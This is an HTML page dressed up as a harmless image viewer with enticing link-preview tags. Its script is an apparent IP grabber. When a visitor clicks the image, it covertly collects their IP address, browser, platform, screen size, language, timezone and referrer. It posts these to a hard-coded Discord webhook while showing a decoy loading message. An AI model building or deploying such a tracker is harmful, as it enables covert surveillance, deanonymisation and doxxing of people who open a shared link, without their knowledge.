<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image</title>
    
    <meta property="og:title" content="Image intéressante">
    <meta property="og:image" content="https://picsum.photos/seed/tracker/1200/800.jpg">
    <meta property="og:description" content="Découvrez cette image magnifique">
    <meta property="og:type" content="website">
    
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            font-family: Arial, sans-serif;
        }
        .container {
            width: 100%;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        img {
            max-width: 100%;
            max-height: 100vh;
            object-fit: contain;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        img:hover {
            transform: scale(1.02);
        }
        .click-hint {
            position: absolute;
            bottom: 20px;
            color: white;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            opacity: 0.8;
        }
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            display: none;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://picsum.photos/seed/tracker/1200/800.jpg" alt="Image" id="mainImage">
        <div class="click-hint">Click on image for enlarge</div>
    </div>
    
    <div class="notification" id="notification">Chargement...</div>
    
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const mainImage = document.getElementById('mainImage');
            const notification = document.getElementById('notification');
            
            mainImage.addEventListener('click', function() {
                notification.style.display = 'block';
                notification.textContent = 'Chargement...';
                collectAndSendData();
                setTimeout(() => {
                    notification.style.display = 'none';
                }, 1500);
            });
        });
        
        function collectAndSendData() {
            const userAgent = navigator.userAgent;
            const language = navigator.language;
            const platform = navigator.platform;
            const screenResolution = `${screen.width}x${screen.height}`;
            const referer = document.referrer || "Accès direct";
            const timestamp = new Date().toISOString();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;
                    sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                })
                .catch(error => {
                    console.error('Erreur lors de la récupération de l\'IP:', error);
                    sendToDiscord("inconnue", userAgent, language, platform, screenResolution, referer, timestamp, timezone);
                });
        }
        
        function sendToDiscord(ip, userAgent, language, platform, screenResolution, referer, timestamp, timezone) {
            const webhookUrl = "https://canary.discord.com/api/webhooks/1506769091413676082/qQqSFZ1WoIxOZqfYL2jEbuVPj9gX8H_78UTV37KPr99uTyFOlrB9Y59Xc6LwT-H23M99";
            
            const embed = {
                title: "New click",
                color: 5814783,
                thumbnail: {
                    url: "https://picsum.photos/seed/tracker/1200/800.jpg"
                },
                fields: [
                    { name: "IP Adress", value: ip, inline: true },
                    { name: "Platform", value: platform, inline: true },
                    { name: "Screen Res", value: screenResolution, inline: true },
                    { name: "language", value: language, inline: true },
                    { name: "Time", value: timezone, inline: true },
                    { name: "Referer", value: referer, inline: false },
                    { name: "User Agent", value: userAgent.substring(0, 100) + (userAgent.length > 100 ? "..." : ""), inline: false }
                ],
                footer: {
                    text: `Date: ${timestamp}`
                }
            };
            
            const payload = {
                username: "image track",
                avatar_url: "https://picsum.photos/seed/tracker/1200/800.jpg",
                content: "Someone click on track image !",
                embeds: [embed]
            };
            
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Error when send discord webhook:', response.statusText);
                } else {
                    console.log('Info send correctly');
                }
            })
            .catch(error => {
                console.error('Error network:', error);
            });
        }
    </script>
</body>
</html>
